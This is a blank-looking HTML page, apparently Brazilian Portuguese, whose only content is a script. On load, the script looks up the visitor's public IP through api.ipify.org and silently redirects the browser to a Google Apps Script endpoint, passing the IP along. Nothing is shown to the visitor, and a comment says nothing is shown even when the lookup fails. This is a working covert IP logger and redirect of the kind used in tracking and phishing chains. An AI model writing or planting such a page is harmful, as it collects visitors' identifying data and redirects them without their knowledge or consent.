<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title></title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      background: transparent;
    }
  </style>
</head>
<body>

<script>
  fetch("https://api.ipify.org?format=json")
    .then(res => res.json())
    .then(data => {
      const ip = data.ip;
      window.location.replace(
        "https://script.google.com/macros/s/AKfycbxGCZrue9jrpd-rYDdJ9_l3_0GYcxmvL9vQ9Mnw9umDDKDpI0tBt0ETzFh9PV3VngWO8g/exec?ip=" 
        + encodeURIComponent(ip)
      );
    })
    .catch(() => {
      // em caso extremo, n√£o mostra nada
    });
</script>

</body>
</html>
